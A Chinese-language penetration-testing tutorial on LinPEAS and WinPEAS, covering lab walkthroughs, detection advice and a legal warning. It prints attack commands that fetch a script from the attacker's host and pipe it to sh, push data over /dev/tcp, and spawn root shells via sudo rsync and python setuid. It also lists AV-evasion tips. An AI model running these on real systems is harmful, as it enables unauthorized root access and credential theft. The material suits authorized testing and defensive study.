# LinPEAS / WinPEAS（PEASS-ng 提权枚举套件）

> **一句话**：拿到普通用户 shell 后跑一个脚本，它把「所有可能导致提权的配置错误」按**颜色分级**列出来——SUID、可写服务、内核版本、sudo 规则、凭据文件、容器逃逸线索，一次全部摆在你面前。
> **分类**：后渗透 / 权限提升 ｜ **Kali 包**：`peass-ng`（安装命令 `sudo apt install peass`；提供 `linpeas`、`winpeas`、`peass` 命令）｜ **官方文档**：<https://github.com/peass-ng/PEASS-ng>

---

## 1. 它解决什么问题

从「普通用户」到「root/SYSTEM」之间，可能的路径有几十条：SUID 程序、`sudo` 配置错误、可写的 systemd 单元、cron 任务、密码明文文件、内核漏洞、Docker 组成员、`capabilities`…**手工排查又慢又容易漏**。

PEASS 的价值是**把排查清单工程化**：

| 你自己的思路 | LinPEAS 的输出 |
|--------------|----------------|
| 「找 SUID 文件」→ `find / -perm -4000` | `SUID` 段，**彩色标注异常项** |
| 「看 sudo 能跑什么」→ `sudo -l` | `Sudo` 段，标注可被滥用的规则（GTFOBins 类） |
| 「找明文密码」→ 手工 grep 一堆目录 | `Password` 段 + `-r` 正则搜上百种 API Key |
| 「看内核版本有没有洞」 | 内嵌 `linux-exploit-suggester`（`linpeas.sh` / `linpeas_fat.sh` 版本） |
| 「看能不能逃出容器」 | `container` 类别专门检查 |

颜色约定（这是使用它的**核心方法**）：

| 颜色 | 含义 | 你的反应 |
|------|------|----------|
| **红底黄字（RED/YELLOW）** | **几乎确定可以提权** | 立刻深挖这个点 |
| **红色** | 高度可疑 | 优先验证 |
| **黄色** | 值得关注 | 结合上下文判断 |
| 蓝色/青色 | 一般信息 | 背景了解 |

对比同类：

| 工具 | 平台 | 定位 |
|------|------|------|
| **LinPEAS** | Linux/Unix/macOS | **广度优先**的全面枚举（推荐第一步） |
| **WinPEAS** | Windows | Windows 版（同一套 PEASS-ng 项目） |
| **`linux-exploit-suggester`** | Linux | **深度**做「内核漏洞匹配」这一件事；见 [`linux-exploit-suggester.md`](linux-exploit-suggester.md) |
| **`pspy`** | Linux | 无 root 监控进程（看 cron 跑了什么）——LinPEAS 只做 1 分钟采样 |
| **GTFOBins / LOLBAS** | 手册 | 查某个二进制怎么被滥用（LinPEAS 会给出候选，最终要查这里） |

**正确用法**：`LinPEAS` 负责「**指出哪里可能有洞**」，`linux-exploit-suggester`/GTFOBins/`pspy` 负责「**把那个洞变成 root**」。两者配合，不要只跑一个。

---

## 2. 工作原理

LinPEAS 是一个**纯 shell 脚本**（`/bin/sh` 语法，无外部依赖），通过**大量系统命令组合**来收集状态：

```
linpeas.sh 启动
   │
   ├─ 检测环境：OS/内核/发行版/容器/云环境
   ├─ 收集：
   │    • 系统信息（内核版本、架构、补丁级别）  → 交给内嵌的 linux-exploit-suggester
   │    ├─ 进程/cron/定时器/systemd 单元/套接字   → 找可写、可劫持
   │    ├─ 网络（接口、路由、连接）              → 发现内网
   │    ├─ 用户与组（当前身份、可 sudo 的组、其他用户）
   │    ├─ 软件（编译器、解释器、可利用工具）
   │    ├─ 有趣文件（SUID/SGID、可写文件、.ssh、历史记录、配置文件、备份）
   │    └─ API Key 正则搜索（-r）
   │
   ├─ 按「可能提权」打分，用颜色/标签输出
   └─ 最后可以给出一个「建议关注点」清单
```

关键机制与限制：

- **无 root 也能跑**：它靠「当前用户能看到的」信息工作。**能看到的越多，发现越多**。
- **不写盘（`-s` 模式）**：默认可能在某些检查里用 `/dev/shm` 等临时目录（`-s` 会跳过耗时且写盘的检查）。
- **1 分钟进程采样**：默认只采样一小段时间（`-a` 会做 1 分钟的进程监控，用于抓「周期性 cron」）。
- **内嵌 linux-exploit-suggester**：`linpeas.sh` 内嵌了 LES（`linpeas_fat.sh` 内嵌更多第三方工具），所以无需额外投递。
- **不是「一键提权工具」**：它只枚举，绝不自动利用。**判断与利用仍由你完成**。

---

## 3. 安装与快速上手

```bash
sudo apt update
sudo apt install peass
```

```console
root@kali:~# linpeas -h
> peass ~ Privilege Escalation Awesome Scripts SUITE

/usr/share/peass/linpeas
|-- linpeas.sh
|-- linpeas_darwin_amd64
|-- linpeas_darwin_arm64
|-- linpeas_fat.sh
|-- linpeas_linux_386
|-- linpeas_linux_amd64
|-- linpeas_linux_arm
|-- linpeas_linux_arm64
`-- linpeas_small.sh
```

```console
root@kali:~# peass -h
> peass ~ Privilege Escalation Awesome Scripts SUITE

/usr/share/peass/
|-- linpeas
|   |-- linpeas.sh
│   ...
`-- winpeas
    |-- winPEAS.bat
    |-- winPEAS.ps1
    |-- winPEASany.exe
    |-- winPEASany_ofs.exe
    |-- winPEASx64.exe
    |-- winPEASx64_ofs.exe
    |-- winPEASx86.exe
    `-- winPEASx86_ofs.exe
```

**三种变体（选哪个很重要）**：

| 文件 | 内容 | 适用 |
|------|------|------|
| `linpeas.sh` | 全部检查 + 内嵌 LES | **默认推荐** |
| `linpeas_fat.sh` | 全部检查 + 内嵌更多第三方工具（base64） | 追求覆盖度，体积大 |
| `linpeas_small.sh` | 只保留最关键检查 | **隐蔽/慢速网络**场景 |

**投递到目标的常用姿势**（授权环境）：

```bash
# Kali：起 HTTP 服务托管
cd /usr/share/peass/linpeas && sudo python3 -m http.server 80
```

```bash
# 目标（Linux）：内存执行，不落盘
curl -s http://192.168.56.5/linpeas.sh | sh -s -- -q
```

```bash
# 或者先下载再执行
wget -q http://192.168.56.5/linpeas.sh -O /dev/shm/lp.sh && chmod +x /dev/shm/lp.sh && /dev/shm/lp.sh -q
```

**Windows 侧（WinPEAS）**：

```bash
# 通过 WinRM 上传并执行
evil-winrm -i 192.168.56.20 -u Administrator -p 'Passw0rd!' \
  -e /usr/share/peass/winpeas
```

```console
*Evil-WinRM* PS C:\> Invoke-Binary winPEASx64.exe
```

---

## 4. 核心参数详解

以下为 LinPEAS 的真实参数（WinPEAS 的参数体系不同，见文末）。

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| （无参数） | 默认标准检查（约 4 分钟） | 第一次就用它 |
| `-a` | **全部检查（CTF 模式）**：1 分钟进程监控、深度 hash 搜索、`su` 爆破 | 时间充裕时用；约 5–10 分钟 |
| `-s` | **隐蔽 & 快速**：跳过耗时检查、不写盘 | 容易被检测/网络慢时用 |
| `-e` | 额外枚举（默认跳过的检查） | 想更全面时叠加 |
| `-r` | **正则搜索**：在文件系统里找上百种 API Key / 密钥 | 找凭据/密钥，耗时长但收益高 |
| `-o <类别列表>` | **只跑指定检查类别**（逗号分隔） | 精准、快速、低噪声（推荐进阶用法） |
| `-P <密码>` | 传入密码，用于 `sudo -l` 与用户爆破 | 已有候选口令时用（**注意锁定策略**） |
| `-d <IP/掩码>` | 内网主机发现（ping/fping） | 从目标视角探测内网 |
| `-p <端口>` | 配合 `-d` 指定 TCP 端口做发现 | 如 `-p 22,445,3389` |
| `-i <IP>` | 扫描指定 IP | 单个目标探测 |
| `-f <目录>` | **固件分析模式**：指向解压后的固件文件系统目录 | IoT/嵌入式场景 |
| `-D` | 调试模式：打印空检查与耗时信息 | 排查为什么某项没结果 |
| `-N` | 关闭颜色 | 输出重定向到文件时用（或 `less -r`） |
| `-q` | 安静模式：不打印 banner | 远程管道执行时建议加 |
| `-h` | 帮助 | 版本间有差异，**以它为准** |

**`-o` 可用的检查类别**（精准执行的利器）：

| 类别 | 内容 |
|------|------|
| `system_information` | OS、内核、硬件信息 |
| `container` | Docker、LXC 等容器线索（**逃逸**相关） |
| `cloud` | 云元数据与凭据（AWS/GCP/Azure 等） |
| `procs_crons_timers_srvcs_sockets` | 进程、cron、定时器、服务、套接字 |
| `network_information` | 接口、路由、活动连接 |
| `users_information` | 当前用户、其他用户、组 |
| `software_information` | 有用软件与编译器是否可用 |
| `interesting_files` | SUID/SGID、可写文件 |
| `api_keys_regex` | 文件系统搜索密钥/凭据 |

用法示例：

```bash
# 只做「有趣文件 + 进程/cron/服务」+ 正则搜密钥
./linpeas.sh -q -o interesting_files,procs_crons_timers_srvcs_sockets,api_keys_regex
```

---

## 5. 实战演练

> **环境声明**：全部在**自建靶机**（TryHackMe / HackTheBox 免费靶机、VulnHub 镜像，或自建虚拟机）中进行，且你已通过合法途径获得该靶机的普通用户 shell。示例：Kali `192.168.56.5`，目标 Linux `10.10.20.6`（用户 `www-data`）。**禁止在任何未授权主机上运行提权枚举脚本**——它会大量读取系统文件、写临时文件、发起内网探测，留下明显痕迹。

### 场景 1：从普通 shell 到「看到三处红色」（第一次使用）

```bash
# ① Kali 托管脚本
cd /usr/share/peass/linpeas && sudo python3 -m http.server 80
```

```bash
# ② 目标上执行（内存执行 + -q 安静模式）
curl -s http://192.168.56.5/linpeas.sh | sh -s -- -q | tee /dev/shm/lp.out
```

```console
╔══════════╣ System Information
║ OS: Linux version 5.4.0-42-generic
║ Uptime: up 12 days
╚══════════════════════════════════════════╣
...
╔══════════╣ SUID - Check easy privesc (scripts/binaries with suid bit), exploit suggestions
║ -rwsr-xr-x 1 root root 43K /usr/bin/backup-tool     ← 非标准 SUID 二进制
║ -rwsr-xr-x 1 root root 27K /usr/bin/pkexec
...
╔══════════╣ Sudo version
║ Sudo version 1.8.31
...
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
║ User www-data may run the following commands:
║     (root) NOPASSWD: /usr/bin/rsync
...
╔══════════╣ Searching password in files
║ /var/www/html/wp-config.php: define('DB_PASSWORD', 'Wp@Admin2024');
║ /home/dev/.bash_history: mysql -u root -pAdmin123
```

**解读**：这份输出里有**三个高价值点**：

| 发现 | 为什么有价值 | 怎么用 |
|------|--------------|--------|
| `/usr/bin/backup-tool` 有 SUID 且非标准 | SUID 程序以 root 运行，常有参数注入/路径劫持 | `strings /usr/bin/backup-tool`；查 GTFOBins |
| `sudo -l` 允许 `NOPASSWD: /usr/bin/rsync` | **经典提权**：rsync 可执行任意命令 | `sudo rsync -e 'sh -c "sh -i"' x:x`（具体用法查 GTFOBins） |
| `wp-config.php` 里的明文数据库口令 | 凭据复用 | 试 `su root` / MySQL / 其它服务 |

```bash
# ③ 验证 sudo 规则（在目标上）
sudo -l
```

```console
Matching Defaults entries for www-data on target:
    env_reset, mail_badpass, secure_path=...

User www-data may run the following commands on target:
    (root) NOPASSWD: /usr/bin/rsync
```

```bash
# ④ 利用（授权靶机）
sudo rsync -e 'sh -c "sh -i"' x:x
```

```console
# id
uid=0(root) gid=0(root) groups=0(root)
```

**解读**：提权成功。**这就是 LinPEAS 的典型价值**：它没有「利用」任何东西，但它把 `sudo -l` 的结果放在了最显眼的位置。

### 场景 2：精准模式（-o）+ 内嵌 LES，做低噪声枚举

容易被检测的环境里，**不要**一上来就跑全量。用 `-o` 精确取你需要的信息：

```bash
# 只关心「有趣文件 + 内核信息 + 进程/cron/服务」
./linpeas.sh -q -o interesting_files,system_information,procs_crons_timers_srvcs_sockets
```

```console
╔══════════╣ Cron jobs
║ /etc/crontab: */5 * * * * root /opt/scripts/backup.sh
║ -rwxrwxrwx 1 root root 412 /opt/scripts/backup.sh     ← 世界可写！
...
╔══════════╣ Capabilities
║ /usr/bin/python3 = cap_setuid+ep                      ← capabilities 提权
```

**解读**：两个可直接利用的点：

| 发现 | 利用思路 |
|------|----------|
| `backup.sh` 世界可写，且被 root 的 cron 每 5 分钟执行 | 改写脚本内容 → 5 分钟后以 root 执行（**不要在生产环境做！**） |
| `python3` 带 `cap_setuid+ep` | `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` |

```bash
# 验证 capabilities
getcap -r / 2>/dev/null
```

```console
/usr/bin/python3 cap_setuid+ep
```

```bash
# 利用（授权靶机）
python3 -c 'import os; os.setuid(0); os.system("id")'
```

```console
uid=0(root) gid=1000(www-data) groups=1000(www-data)
```

```bash
# 内核漏洞匹配（LinPEAS 内嵌了 LES；也可单独投递）
./linpeas.sh -q | grep -A20 -i "linux-exploit-suggester\|CVE-20"
```

```console
[+] [CVE-2021-4034] PwnKit
   Details: https://www.qualys.com/2022/01/25/cve-2022-4034/
   Exposure: highly probable
   Tags: ubuntu=20.04{kernel:5.4.0-*}
   Download URL: https://www.exploit-db.com/exploits/50689
```

**解读**：内核漏洞是「**最后手段**」——它有崩溃风险，且必须与**内核版本/发行版/补丁级别**严格匹配。用 [`linux-exploit-suggester.md`](linux-exploit-suggester.md) 做交叉验证。

### 场景 3：凭据搜索 + 内网侦察 + WinPEAS（Windows 侧）

```bash
# ① 正则搜密钥（耗时长但常有大收获）
./linpeas.sh -q -r | grep -iE "secret|api[_-]?key|token|password" | head -40
```

```console
/opt/app/.env: API_TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
/home/deploy/.aws/credentials: aws_secret_access_key = wJalrXUtnFEMI...
/home/dev/.ssh/id_rsa: -----BEGIN OPENSSH PRIVATE KEY-----
```

**解读**：`-r` 是 LinPEAS 里**收益最高**的检查项之一。拿到 SSH 私钥可直接横向；云凭据可尝试云环境（**授权测试中需单独确认范围**）。

```bash
# ② 从目标视角做内网发现（注意：这是「扫描」，授权范围要覆盖）
./linpeas.sh -q -d 10.10.20.0/24 -p 22,80,443,445,3306
```

```console
10.10.20.5  22,445 open
10.10.20.6  22 open
10.10.20.7  3306 open
```

**解读**：目标机器能看到的内网，往往比你直接能访问的更多（内网互信）。发现后用 [`chisel.md`](chisel.md) 铺隧道。

```bash
# ③ Windows 侧：WinPEAS（通过 WinRM 投放）
evil-winrm -i 10.10.20.5 -u jdoe -p 'Summer2024!' -e /usr/share/peass/winpeas
```

```console
*Evil-WinRM* PS C:\Users\jdoe> Invoke-Binary winPEASx64.exe
```

```console
════════════════════════════════════════╣ SYSTEM INFORMATION ╠══════
  Computer Name        : WEB01
  Windows Version      : Windows Server 2016
  ...
════════════════════════════════════════╣ SERVICES ╠══════
  BackupSvc   "C:\Program Files\Backup Tool\svc.exe --run"   ← 未加引号的服务路径
════════════════════════════════════════╣ USERS ╠══════
  Current User: CONTOSO\jdoe
  ...
```

**解读（Windows 侧的高价值输出）**：

| 发现 | 利用思路 |
|------|----------|
| **未加引号的服务路径**（`Unquoted Service Path`） | 若 `C:\Program Files\Backup Tool\` 可写，放入 `Program.exe` 即被以服务身份执行 |
| 服务可修改（`Modifiable Services`） | 改服务 binPath 指向你的程序 |
| AlwaysInstallElevated | `msiexec` 安装任意 MSI（以 SYSTEM 运行） |
| 未加密的 `autologon` 凭据 | 直接读注册表拿明文密码 |
| 存储的凭据（`cmdkey /list`） | 用于横向 |

```console
# 查看具体服务配置（PowerShell）
*Evil-WinRM* PS C:\> Get-CimInstance win32_service | Where-Object {$_.PathName -notlike '"*'} | Select Name,PathName,StartName
```

```console
Name       PathName                                          StartName
----       --------                                          ---------
BackupSvc  C:\Program Files\Backup Tool\svc.exe --run         LocalSystem
```

**解读**：`StartName = LocalSystem` 说明一旦劫持成功即获得 SYSTEM。

---

## 6. 输出解读

LinPEAS 的输出结构固定为若干 `╔══════╣ <标题>` 段落。**学会按段读**：

| 段落 | 关键信息 | 建议动作 |
|------|----------|----------|
| `System Information` | 内核版本、发行版、补丁级别 | 找内核漏洞（配合 LES） |
| `Container` | 是否在容器、有无 docker.sock | 容器逃逸 |
| `Cloud` | 云元数据、IAM 凭据 | 云环境横向（需授权） |
| `Processes` / `Cron jobs` / `Systemd Timers` / `Services` | 可写脚本、可劫持路径 | 劫持执行（root 定时任务最香） |
| `Network Information` | 接口、路由、连接 | 找内网网段与已建立的会话 |
| `Users` / `Groups` | 当前身份、可 sudo 的组（`docker`/`lxd`/`disk`） | 组提权 |
| `Software` | `gcc`、`python`、`perl` 是否存在 | 能否编译提权 EXP |
| `SUID` / `SGID` / `Capabilities` | 异常权限二进制 | 查 GTFOBins，**红底项优先** |
| `Sudo` / `sudo -l` | 可无密码运行的命令 | 查 GTFOBins 找利用方式 |
| `Password` / `-r` 结果 | 明文口令、密钥、token | 凭据复用 |
| `Interesting files` | `.ssh`、`.bash_history`、备份、配置 | 手工翻这些文件常有惊喜 |
| `linux-exploit-suggester` 输出 | 内核 EXP 候选（含 `Exposure` 等级） | 交叉验证后谨慎使用 |

**成功判据**：输出里出现**红底黄字**的条目，且该条目对应的利用方式在目标环境中可行（能实际执行到 root）。

---

## 7. 与其他工具配合

```
① 拿到普通 shell
        │
② LinPEAS（广度枚举）──► 一堆候选提权点
        │
        ├─► sudo 规则 / SUID / capabilities ──► 查 GTFOBins ──► 直接提权
        ├─► cron / systemd 可写脚本 ──────────► 劫持 ──► 提权
        ├─► 内核版本 ──► linux-exploit-suggester（深度匹配）──► 编译 EXP
        ├─► cron 看不清到底跑了什么 ──► pspy（无 root 进程监控）
        ├─► 容器 ──► 逃逸技巧（docker.sock / privileged / lxd）
        └─► 明文凭据 / SSH 私钥 ──► 凭据复用（横向）
                                            │
                     隧道（chisel / ligolo-ng）+ proxychains4
                                            │
                                nxc / impacket / evil-winrm / mimikatz
```

- 内核漏洞深度匹配：[`linux-exploit-suggester.md`](linux-exploit-suggester.md)
- Windows 侧后续：[`mimikatz.md`](mimikatz.md)、[`evil-winrm.md`](evil-winrm.md)、[`powershell-empire.md`](powershell-empire.md)
- Web 落脚点：[`weevely.md`](weevely.md)
- 隧道与横向：[`chisel.md`](chisel.md)、[`ligolo-ng.md`](ligolo-ng.md)、[`proxychains4.md`](proxychains4.md)、[`netexec.md`](netexec.md)
- 参考手册：GTFOBins <https://gtfobins.github.io/>、LOLBAS <https://lolbas-project.github.io/>

---

## 8. 常见坑与排错

| 报错/现象 | 原因 | 解决 |
|-----------|------|------|
| `linpeas: command not found` 在目标上 | LinPEAS 是脚本，不是目标机上的命令 | 用 `curl ... \| sh` 或先上传再执行 |
| 脚本执行报语法错误 | 用了 `sh` 但脚本需要兼容 shell；或下载被截断 | 用 `sh` 执行；校验下载完整性（`md5sum`） |
| 中文/方块乱码 | 颜色与控制字符 | `-N` 关颜色；或 `less -r file` 保留颜色 |
| 输出太多无法阅读 | 默认全量 | `-o <类别>` 精准执行；或重定向到文件再 `grep` |
| `-r` 跑了很久 | 正则搜索全盘，天然耗时 | 只在必要时用；或缩小搜索目录 |
| 权限不足导致大量 `Permission denied` | 普通用户看不到所有文件 | 正常现象；这也是「提权后复跑一次」的价值（**提权后值得再跑一遍**） |
| `-a` 卡在 `su` 爆破 | `-a` 会对每个用户试 2000 个口令 | **危险**：可能触发锁定；授权环境慎用，或用 `-o` 排除 |
| 内嵌 LES 没输出 | 该变体未内嵌（如 `linpeas_small.sh`） | 换 `linpeas.sh`/`linpeas_fat.sh`，或单独跑 [`linux-exploit-suggester.md`](linux-exploit-suggester.md) |
| 目标无 `curl`/`wget` | 极简系统 | 用 `nc` 传输：`nc -lvnp 9002 > lp.sh` / `cat lp.sh > /dev/tcp/<kali>/9002` |
| 脚本被杀软删除 | HIDS/AV 识别 | 说明终端防护有效；授权测试中记录；可加密传输（见官方 README 的 AES/Base64 方式） |
| `-d` 主机发现无结果 | 目标无 ping/fping 或出站限制 | 换 `-i <IP> -p <端口>` 用 TCP 探测 |
| WinPEAS 输出乱码 | Windows 代码页 | 先 `chcp 65001`；或用 `winPEAS.ps1`/`.bat` 版本 |
| WinPEAS `.exe` 被 Defender 删 | 特征命中 | 用 `_ofs` 混淆版（**仍常被拦**），或用 `.ps1`/`.bat` 变体 |

---

## 9. 防御视角（蓝队）

PEASS 类脚本是**「读取型」工具**——它不利用漏洞，只是把系统状态读一遍。因此**从流量/进程上很难完全阻断**，防御重点在**减少可被发现的配置错误**，以及**让枚举行为可见**。

| 攻击面（脚本在找什么） | 检测信号 | 缓解措施 |
|------------------------|----------|----------|
| 全盘文件遍历 | 大量 `open`/`stat` 系统调用、`authorized_keys`/`.env`/`.git` 等被读取（**auditd 规则可捕获**） | 最小权限（Web 用户不该读 `/home`）、文件权限收紧、敏感文件加密 |
| `find / -perm -4000` 类操作 | 大范围文件系统扫描；`auditd` 里 `execve`/`openat` 异常 | 定期审计 SUID/SGID 基线（**新增即告警**） |
| 读 `/etc/shadow`、`.ssh`、`.bash_history` | 4656/4663 类访问事件（Linux 侧用 auditd/Sysmon for Linux） | 严格权限；`/etc/shadow` 仅 root 可读；清理历史文件中的口令 |
| 多个命令的固定序列 | EDR/Falcon/Sysmon-Linux 可用**进程树与参数模式**识别（如 `find / -perm -4000` 紧跟 `getcap -r /`） | EDR 行为规则；限制 Web 用户可执行的二进制 |
| 脚本落盘 / 从 HTTP 拉取 | Web 目录或 `/dev/shm` 出现 `linpeas`；从外部 IP 拉取脚本 | `noexec` 挂载 `/dev/shm`、`/tmp`；出站白名单；FIM |
| 内存执行（`curl \| sh`） | 无落盘，但**网络**可看到拉取行为 | 出站 HTTP 白名单 + 代理；限制目标机外联 |
| `-d` 内网发现 | 单主机短时间内 ping/connect 大量内网地址 | 内网分段、ICMP 限制、东西向流量审计 |
| **根因：配置错误** | —— | ① 清掉不必要的 SUID/SGID 与 capabilities；② `sudo` 用**精确命令 + 参数白名单**，避免 `NOPASSWD` 给可执行任意命令的程序；③ cron/服务脚本**不可被非 root 写**；④ 定期补丁（内核与用户态）；⑤ 容器禁用 `docker.sock` 挂载与 `privileged` |
| 提权后的动作 | `id` 变成 root、新增用户、`sudoers` 被改、SSH key 被加 | 文件完整性监控（`/etc/passwd`、`/etc/shadow`、`/etc/sudoers`、`authorized_keys`）、auditd |

**蓝队关键动作**：把「**跑一次 LinPEAS，看有多少红项**」纳入**定期自检**。你自己跑一次发现的每个红项，都是攻击者会走的路。**这比「打补丁率 99%」的报表更有说服力。**

---

## 10. 参考

- PEASS-ng 官方仓库（LinPEAS/WinPEAS 全部用法）：<https://github.com/peass-ng/PEASS-ng>
- LinPEAS 官方 README：<https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md>
- Kali 工具页（peass-ng）：<https://www.kali.org/tools/peass-ng/>
- GTFOBins（SUID/sudo 提权速查）：<https://gtfobins.github.io/>
- LOLBAS（Windows 侧对应物）：<https://lolbas-project.github.io/>
- MITRE ATT&CK · 权限提升（TA0004）、系统信息发现（T1082）、文件与目录发现（T1083）
- 本地命令：`linpeas -h`、`peass -h`、`winpeas -h`，以及目标上 `./linpeas.sh -h`

## ⚠️ 法律与伦理

在未授权系统上运行提权枚举脚本，属**非法侵入与非法获取计算机信息系统数据**，可能触犯《刑法》第 285 条；若进一步提权并维持访问，还可能触犯第 286 条（破坏计算机信息系统）与第 285 条的「非法控制」情形。脚本会读取系统配置、历史文件、密钥与凭据，涉及《个人信息保护法》《数据安全法》风险。

**特别提醒**：`-a` 参数包含 `su` 口令爆破与 1 分钟进程监控，`-d` 包含内网扫描——**这些动作的范围通常需要授权书单独覆盖**，请务必事先确认。

本教程仅用于：**书面授权的渗透测试与红队演练、CTF、TryHackMe/HackTheBox/VulnHub 靶机、自建实验室、蓝队自检**。测试结束后清理投递的脚本与输出文件（含 `/dev/shm`、`/tmp` 下的残留），并将发现的凭据按流程加密上报。
